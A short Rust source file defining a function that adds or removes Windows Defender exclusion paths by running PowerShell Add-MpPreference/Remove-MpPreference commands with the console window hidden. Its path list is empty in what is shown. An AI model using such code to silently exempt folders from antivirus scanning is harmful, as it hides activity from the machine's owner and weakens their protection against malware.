use std::process::Command;
use std::os::windows::process::CommandExt;

const CREATE_NO_WINDOW: u32 = 0x08000000;
////////////////////////////////////////////////////
///////////////////// 82000 NEO ////////////////////
////////////////////////////////////////////////////


pub fn cs8200neo_defender(action: String) {
    let paths = vec![
        "",
    ];

    for path in paths.iter() {
        let command = match action.to_lowercase().as_str() {
            "add" => format!(r#"Add-MpPreference -ExclusionPath "{}""#, path),
            "remove" => format!(r#"Remove-MpPreference -ExclusionPath "{}""#, path),
            _ => continue,
        };
        Command::new("powershell")
            .args(&["-Command", &command])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .expect("failed to execute process");

    }
}
